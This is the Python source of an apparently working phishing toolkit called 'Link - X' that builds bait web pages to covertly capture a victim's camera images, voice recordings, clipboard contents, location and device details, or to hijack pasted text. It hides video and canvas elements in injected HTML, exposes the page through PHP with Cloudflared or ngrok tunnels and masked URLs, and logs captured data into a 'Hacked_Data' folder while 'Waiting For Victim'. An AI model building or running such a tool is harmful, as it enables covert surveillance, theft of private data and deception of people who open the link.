##### About Tool #####
# Link - X    :    Hack With Link
# Author     :    ToxicNoob
# Version    :    1.0
# GitHub     :    https://github.com/Toxic-Noob/

# Learn Everything, Teach Everyone
# Be a Toxic, Become a Legion

### Some Credits ###
# SayCheese (thelinuxchoice)  :  https://github.com/thelinuxchoice/saycheese
# Storm-Breaker (ultrasecurity) : https://github.com/ultrasecurity/Storm-Breaker
# Copy-Paste-Hack-Js (marco97pa) : https://github.com/marco97pa/copy-paste-hack-js
# Clipboardme (cyberkallan) : https://github.com/cyberkallan/clipboardme
# ZPhisher (htr-tech) : https://github.com/htr-tech/zphisher
############

# If You Copy Any Code,, Give Credit!!


import os
import sys
import time
import json
import subprocess as sb
import random
import shutil
from lib.more import *

def psb(z):
    for p in z + "\n":
        sys.stdout.write(p)
        sys.stdout.flush()
        time.sleep(0.02)


columns = shutil.get_terminal_size().columns
#CustomInjections
inj_camera = "\n<script type=\"text/javascript\" src=\"https://wybiral.github.io/code-art/projects/tiny-mirror/index.js\"></script>\n<link rel=\"stylesheet\" type=\"text/css\" href=\"https://wybiral.github.io/code-art/projects/tiny-mirror/index.css\">\n<script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js\"></script>\n"
inj_camera_2 = "\n<div class=\"video-wrap\" hidden=\"hidden\">\n<video id=\"video\" playsinline autoplay></video>\n</div>\n<canvas hidden=\"hidden\" id=\"canvas\" width=\"640\" height=\"480\"></canvas>\n"
inj_voice = "\n<script src=\"https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js\"></script>\n<script src=\"js/custom.js\"></script>\n"
inj_clipboard = "\n<script src=\"js/main.js\"></script>\n<script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js\"></script>\n"
inj_location = "\n<script src=\"js/client.min.js\"></script>\n<script src=\"js/custom.js\"></script>"
inj_paste = "\n<script src=\"js/temp.js\"></script>\n"
inj_about = "\n<script src=\"js/custom.js\"></script>\n"


#CustomRedirect
def redirect_url():
    method = menu.method
    if (method == "camera"):
        path = ".camera"
    elif (method == "voice"):
        path = ".voice"
    elif (method == "clipboard"):
        path = ".clipboard"
    elif (method == "location"):
        path = ".location"
    elif (method == "about_device"):
        path = ".about_device"
    file = open(path+"/js/main.js", "r").read()
    print("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Redirect URL :")
    url = input("    [ \033[37mDefault: YouAreGettingOld\033[92m ]:> \033[37m")
    if not (url == "") and not ("http" in url):
        url = "https://"+url
    if (url == ""):
        file = file.replace("$RedURL$", "http://you.regettingold.com/")
    else:
        file = file.replace("$RedURL$", url)
    file_out = open(path+"/js/temp.js", "w")
    file_out.write(file)
    file_out.close()

#DefaultSite
def default_site():
    method = menu.method
    if (method == "camera"):
        path = ".camera"
    elif (method == "voice"):
        path = ".voice"
    elif (method == "clipboard"):
        path = ".clipboard"
    elif (method == "location"):
        path = ".location"
    elif (method == "paste"):
        path = ".paste"
    elif (method == "about_device"):
        path = ".about_device"
    file = open(path+"/index_data.html", "r").read()
    file_out = open(path+"/index2.html", "w")
    file_out.write(file)
    file_out.close()


#CustomSite
def custom_site():
    method = menu.method
    site_path = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Site Path:> \033[37m")
    while not os.path.exists(site_path):
        psb("\n\033[92m    [\033[91m!\033[92m] File Path Does Not Exists!")
        site_path = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Site Path:> \033[37m")
    file = open(site_path, "r").read()
    #Camera#
    if (method == "camera"):
        if ("<head>" in file):
            file = file.replace("<head>", "<head>"+inj_camera)
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_camera)
        else:
            file = inj_camera+file
        if ("</head>" in file):
            file = file.replace("</head>", "</head>"+inj_camera_2)
        elif ("<body>" in file):
            file = file.replace("<body>", inj_camera_2+"<body>")
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_camera_2)
        else:
            file = file+inj_camera_2
        if ("</html>" in file):
            file = file.replace("</html>", "<script src=\"js/custom.js\"></script>\n</html>")
        else:
            file = file + "<script src=\"js/custom.js\"></script>\n"
        file_out = open(".camera/index2.html", "w")
        file_out.write(file)
        file_out.close()
    #Voice#
    elif (method == "voice"):
        if ("<head>" in file):
            file = file.replace("<head>", "<head>"+inj_voice)
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_voice)
        else:
            file = inj_voice+file
        file_out = open(".voice/index2.html", "w")
        file_out.write(file)
        file_out.close()
    #Clipboard#
    elif (method == "clipboard"):
        if ("<head>" in file):
            file = file.replace("<head>", "<head>"+inj_clipboard)
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_clipboard)
        else:
            file = inj_clipboard+file
        file_out = open(".clipboard/index2.html", "w")
        file_out.write(file)
        file_out.close()
    #location#
    elif (method == "location"):
        if ("<head>" in file):
            file = file.replace("<head>", "<head>"+inj_location)
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_location)
        else:
            file = inj_location+file
        file_out = open(".location/index2.html", "w")
        file_out.write(file)
        file_out.close()
    #AboutDevice#
    elif (method == "about_device"):
        if ("<head>" in file):
            file = file.replace("<head>", "<head>"+inj_about)
        elif ("<html>" in file):
            file = file.replace("<html>", "<html>"+inj_about)
        else:
            file = inj_about+file
        file_out = open(".about_device/index2.html", "w")
        file_out.write(file)
        file_out.close()
    time.sleep(0.8)

#PasteJackingCustomSite
def custom_paste_site():
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Copy the Below Code and Paste it in the Spot of Your HTML file, Where You Want To Show Your 'Copy Me'  Text..")
    print("\n\033[92m    [\033[37m <p id=\"copyme\">Your Text Here</p> \033[92m]\033[37m")
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m You can also use Your Own Code Instade of The Code Avobe. But Make Sure That, Your 'Copy Me' Text's Element id is \"copyme\" . Or Else, PasteJacking Will NOT WORK!!")
    time.sleep(1)
    site_path = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Site Path:> \033[37m")
    while not os.path.exists(site_path):
        psb("\n\033[92m    [\033[91m!\033[92m] File Path Does Not Exists!")
        site_path = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Site Path:> \033[37m")
    site_data = open(site_path, "r").read()
    while not ("id=\"copyme\"" in site_data) and not ("id = \"copyme\"" in site_data) and not ("id= \"copyme\"" in site_data) and not ("id =\"copyme\"" in site_data) and not ("id='copyme'" in site_data) and not ("id = 'copyme'" in site_data) and not ("id= 'copyme'" in site_data) and not ("id ='copyme'" in site_data):
        time.sleep(0.4)
        psb("\n\033[92m    [\033[91m!\033[92m] You Did Not Specified Element id \"copyme\" in your HTML File!")
        site_path = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Site Path:> \033[37m")
        site_data = open(site_path, "r").read()
    copy = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Copy:> \033[37m")
    while (copy == ""):
        psb("\n\033[92m    [\033[91m!\033[92m] You Must Enter Something...!!")
        copy = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Copy:> \033[37m")
    #CreateIndexFile
    file = open(site_path, "r").read()
    if ("</body>" in file):
        file = file.replace("</body>", inj_paste+"</body>")
    elif ("</html>" in file):
        file = file.replace("</html>", inj_paste+"</html>")
    else:
        file = file + inj_paste
    file_out = open(".pastejacking/index2.html", "w")
    file_out.write(file)
    file_out.close()
    #CreateJSFile
    file = open(".pastejacking/js/main.js", "r").read()
    file = file.replace("$CopyData$", copy)
    file_out = open(".pastejacking/js/temp.js", "w")
    file_out.write(file)
    file_out.close()


#CameraHack
def camera():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if (site == "y"):
        custom_site()
    else:
        default_site()
        redirect_url()
    os.system("cd .camera && cp -r * ../.server/upload")
    tunnel()

#VoiceHack
def voice():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if (site == "y"):
        custom_site()
    else:
        default_site()
        redirect_url()
    os.system("cd .voice && cp -r * ../.server/upload")
    tunnel()

#ClipboardHack
def clipboard():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if (site == "y"):
        custom_site()
    else:
        default_site()
        redirect_url()
    os.system("cd .clipboard && cp -r * ../.server/upload")
    tunnel()


#LocationHack
def location():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if (site == "y"):
        custom_site()
    else:
        default_site()
        redirect_url()
    os.system("cd .location && cp -r * ../.server/upload")
    tunnel()

#GetVictimeDeviceDetails_AsMuchAsPossible
def about_device():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if (site == "y"):
        custom_site()
    else:
        default_site()
        redirect_url()
    os.system("cd .about_device && cp -r * ../.server/upload")
    tunnel()

#PasteJacking
def paste():
    site = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Want To Use Your Custom Site? [y/n]: ").lower()
    if not (site == "y"):
        show = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Show:> \033[37m")
        while (show == ""):
            psb("\n\033[92m    [\033[91m!\033[92m] You Must Enter Something...!!")
            show = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Show:> \033[37m")
        copy = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Copy:> \033[37m")
        while (copy == ""):
            psb("\n\033[92m    [\033[91m!\033[92m] You Must Enter Something...!!")
            copy = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Text To Copy:> \033[37m")
        #CreateIndexFile
        file = open(".pastejacking/index_data.html", "r").read()
        file = file.replace("$Show$", show)
        file_out = open(".pastejacking/index2.html", "w")
        file_out.write(file)
        file_out.close()
        #CreateJSFile
        file = open(".pastejacking/js/main.js", "r").read()
        file = file.replace("$CopyData$", copy)
        file_out = open(".pastejacking/js/temp.js", "w")
        file_out.write(file)
        file_out.close()
    else:
        custom_paste_site()
    os.system("cd .pastejacking && cp -r * ../.server/upload")
    tunnel()

#KillAllProcess
def killer():
    if os.system("pidof php > /dev/null 2>&1")==0:
        os.system("killall php > /dev/null 2>&1")
    if os.system("pidof ngrok > /dev/null 2>&1")==0:
        os.system("killall ngrok > /dev/null 2>&1")
    if os.system("pidof cloudflared > /dev/null 2>&1")==0:
        os.system("killall cloudflared > /dev/null 2>&1")
    if os.system("pidof curl > /dev/null 2>&1")==0:
        os.system("killall curl > /dev/null 2>&1")
    if os.system("pidof wget > /dev/null 2>&1")==0:
        os.system("killall wget > /dev/null 2>&1")
    if os.system("pidof unzip > /dev/null 2>&1")==0:
        os.system("killall unzip > /dev/null 2>&1")

##GettingData##
#GetIP
def get_ip():
    path = ".server/upload/ip.txt"
    if os.path.exists(path):
        ip_data = open(path, "r").readlines()
        try:
            ip_data = ip_data[0].replace("IP: ", "").replace("\n", "")
        except:
            ip_data = ip_data[1].replace("IP: ", "").replace("\n", "")
        print("\n\033[94m    [\033[92m+\033[94m] Victim Opened The Link!!")
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Victim IP : \033[37m"+ip_data)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Saved In : \033[37m ip.txt")
        os.system("cat "+path+" >> ip.txt")
        os.system("rm "+path)
    
#GetLog
def get_log():
    method = menu.method
    body = str(time.time())
    if not os.path.exists("Hacked_Data"):
        os.mkdir("Hacked_Data")
    if (method == "camera"):
        exte = ".png"
        head = "cam_"
        file = "Image File"
    elif (method == "voice"):
        exte = ".wav"
        head = "audio_"
        file = "Voice File"
    elif (method == "clipboard"):
        exte = ".dat"
        head = "clipboard_"
        file = "Clipboard Data"
    elif (method == "location"):
        exte = ".json"
        head = "location_"
        file = "Location Data"
    elif (method == "about_device"):
        exte = ".json"
        head = "details_"
        file = "Device Details"
    
    path = ".server/upload/Log.log"
    if os.path.exists(path):
        log_data = open(path, "r").read()
        if "received" in log_data.lower():
            print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m "+file+" Received!!")
            os.system("rm "+path)
            if (head == "clipboard_"):
                dt = open(".server/upload/data.dat", "r").read()
                print("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Clipboard Data : \033[37m"+dt)
            elif (head == "location_"):
                data = open(".server/upload/data.json").read().replace("[", "").replace("]", "")
                print_location(data)
            elif (head == "details_"):
                data = open(".server/upload/data.json").read().replace("[", "").replace("]", "")
                print_details(data)
            os.system("mv .server/upload/*"+exte+" Hacked_Data/"+head+body+exte)
            


##ExposeProcess##
host = "127.0.0.1"
port = str(random.randint(1111, 9999))
#LocalHost
def localhost():
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Setting Up Files...")
    time.sleep(0.5)
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Starting PHP Server...")
    os.system("cd .server/upload && php -S "+host+":"+port+" > /dev/null 2>&1 &")
    time.sleep(0.8)
    

#Cloudflared
def cloudflare():
    os.system("rm .cld.log > /dev/null 2>&1")
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Launching Cloudflared...")
    try:
        os.system("termux-chroot ./.server/cloudflared tunnel -url \""+host+"\":\""+port+"\" --logfile .cld.log > /dev/null 2>&1 &")
    except:
        os.system("./.server/cloudflared tunnel -url \""+host+"\":\""+port+"\" --logfile .cld.log > /dev/null 2>&1 &")
    time.sleep(8)
    cld_data = open(".cld.log", "r").readlines()
    line = 1
    data = cld_data[line]
    while not ".trycloudflare.com" in data:
        line = line+1
        data = cld_data[line]
    head = data.find("https://")
    tail = data.find(".trycloudflare.com")
    url_data = data[head:tail]
    if not "http" in url_data:
        url_data = "https://"+url_data
    if not ".trycloudflare.com" in url_data:
        url_data = url_data+".trycloudflare.com"
    return url_data

#Ngrok
def ngrok():
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Launching Ngrok....")
    try:
        os.system("termux-chroot ./.server/ngrok http \""+host+"\":\""+port+"\" > /dev/null 2>&1 &")
    except:
        os.system("cd .server && ./ngrok http \""+host+"\":\""+port+"\" > /dev/null 2>&1 &")
    time.sleep(8)
    url_data = sb.getoutput("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[-0-9a-z]*\.ngrok.io\"")
    return url_data

#TunnelMenu
def tunnel():
    logo()
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Choose Your Expose Method:")
    print("\n\033[92m    \033[94m[\033[37m01\033[94m]\033[92m Localhost \033[37m(For Devs)")
    print("\033[92m    \033[94m[\033[37m02\033[94m]\033[92m CloudFlared \033[37m(Best!)")
    print("\033[92m    \033[94m[\033[37m03\033[94m]\033[92m Ngrok \033[37m(Fine)")
    op = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Choice:> \033[37m").replace("0", "")
    while not op in ["1", "2", "3"]:
        psb("\n\033[92m    [\033[91m!\033[92m] Choose a Correct Option!!")
        op = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Choice:> \033[37m").replace("0", "")
    if (op == "1"):
        localhost()
        url = ""
        mask = ""
    elif (op == "2"):
        localhost()
        print("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter URL Masking Text or URL:")
        mask = input("    [ \033[37mPress Enter To Skip\033[92m ]:> \033[37m")
        url = cloudflare()
    elif (op == "3"):
        localhost()
        print("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter URL Masking Text or URL:")
        mask = input("    [ \033[37mPress Enter To Skip\033[92m ]:> \033[37m")
        url = ngrok()
    alert_panel(url, mask)

#MainOutPutPanel
def alert_panel(url = "", mask = ""):
    if not (url == "") and not (mask == ""):
        masked_url = mask_url(url, mask)
    if (mask == "") and not (url == ""):
        masked_url = short_url(url)
    logo()
    print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Successfully Hosted At : \033[37mhttp://127.0.0.1:"+port)
    if not (url == ""):
        print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL 1 : \033[37m"+url)
        print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m URL 2 : \033[37m"+masked_url)
    if (menu.method == "about_device"):
        print("\n\033[92m\033[94m[\033[37m+\033[94m]\033[92m Use a VPN To Get Extra Device Informations...")
    print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m All Your Data is Saved In \033[37mHacked_Data \033[92mFolder")
    print("\n\033[92m\033[94m[\033[37m*\033[94m]\033[92m Waiting For Victim, Press \033[37mCtrl + c \033[92mto Exit....")
    time.sleep(1)
    while True:
        try:
            get_ip()
            get_log()
        except KeyboardInterrupt:
            print("\n\033[92m    [\033[91m!\033[92m] Process Canceled By User...\n\033[37m")
            break

#MainMenu
def menu():
    logo()
    time.sleep(0.8)
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Choose Your Option:")
    print("\n    \033[94m[\033[37m01\033[94m]\033[92m Camera Hack")
    print("    \033[94m[\033[37m02\033[94m]\033[92m Voice Hack")
    print("    \033[94m[\033[37m03\033[94m]\033[92m Clipboard Hack")
    print("    \033[94m[\033[37m04\033[94m]\033[92m Location Hack")
    print("    \033[94m[\033[37m05\033[94m]\033[92m PasteJacking")
    print("    \033[94m[\033[37m06\033[94m]\033[92m Get Victim Device Details")
    print("    \033[94m[\033[37m07\033[94m]\033[92m Update Tool")
    print("    \033[94m[\033[37m##\033[94m]\033[92m Exit")
    op = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Choice:> \033[37m").replace("0", "").replace("##", "#")
    while not op in ["1", "2", "3", "4", "5", "6", "7", "#"]:
        psb("\n\033[92m    [\033[91m!\033[92m] Choose a Correct Option!!")
        op = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Enter Your Choice:> \033[37m").replace("0", "").replace("##", "#")
    
    if (op == "1"):
        menu.method = "camera"
        camera()
    elif (op == "2"):
        menu.method = "voice"
        voice()
    elif (op == "3"):
        menu.method = "clipboard"
        clipboard()
    elif (op == "4"):
        menu.method = "location"
        location()
    elif (op == "5"):
        menu.method = "paste"
        paste()
    elif (op == "6"):
        menu.method = "about_device"
        about_device()
    elif (op == "7"):
        update()
    elif (op == "#"):
        logout()

#MainProcess#
if __name__ == "__main__":
    if not os.path.exists(".server/ngrok") or not os.path.exists(".server/cloudflared"):
        os.system("bash setup.sh")
    if not os.path.exists(".server/upload"):
        os.mkdir(".server/upload")
    os.system("rm -rf .server/upload/* > /dev/null 2>&1")
    killer()
    menu()
